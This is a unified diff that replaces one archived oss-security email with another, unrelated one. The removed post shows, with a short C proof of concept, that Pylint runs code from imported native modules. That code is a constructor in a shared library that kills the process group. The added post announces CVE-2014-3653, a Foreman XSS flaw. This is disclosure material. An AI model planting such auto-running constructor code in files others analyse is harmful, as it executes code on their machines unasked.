@@ -1,48 +1,24 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/29/9
-Message-ID: <20140929123221.GA4178@jwilk.net>
-Date: Mon, 29 Sep 2014 14:32:21 +0200
-From: Jakub Wilk <jwilk@...lk.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/23/1
+Message-ID: <5420CCB1.8010100@redhat.com>
+Date: Tue, 23 Sep 2014 11:28:17 +1000
+From: Murray McAllister <mmcallis@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Pylint checks not as static as one would think
+Subject: CVE-2014-3653 Foreman: XSS flaw on template preview screen
 Content-Type: text/plain; charset=utf-8
 
-Pylint[0] is advertised as "a static code checker, meaning it can 
-analyse your code without actually running it"[1] and that it "does 
-not import live modules"[1].
+Good morning,
 
-This is, unfortunately, far from reality. Here's a PoC:
+CVE-2014-3653 was assigned to a cross-site scripting flaw in Foreman's 
+template preview screen (templates are shared amongst users):
 
-$ cat moo.py
-from _moo import *
+http://projects.theforeman.org/issues/7483
+https://github.com/sodabrew/foreman/issues/1
 
-$ cat moo.c
-#include <stdio.h>
-#include <signal.h>
-void __attribute__((constructor)) moo() {
-	printf("moo!\n");
-	kill(0, SIGSEGV);
-}
+No Red Hat bug yet, but it will be accessible via 
+bugzilla.redhat.com/CVE-2014-3653 once it is filed.
 
-$ gcc -Wall -shared -fPIC moo.c -o _moo.so
+Cheers,
 
-$ pylint moo.py
-No config file found, using default configuration
-moo!
-Segmentation fault
-
-
-My understanding is that upstream Pylint maintainers consider this 
-behavior intentional[2]. But even then, I think it's a serious 
-documentation flaw.
-
-Should a CVE ID be assigned to this bug? If yes, it should be a 
-CVE-2010-XXXX.
-
-
-[0] http://www.pylint.org/
-[1] http://docs.pylint.org/faq.html#about-pylint
-[2] https://bugs.debian.org/591676#28
-
--- 
-Jakub Wilk
+--
+Murray McAllister / Red Hat Product Security
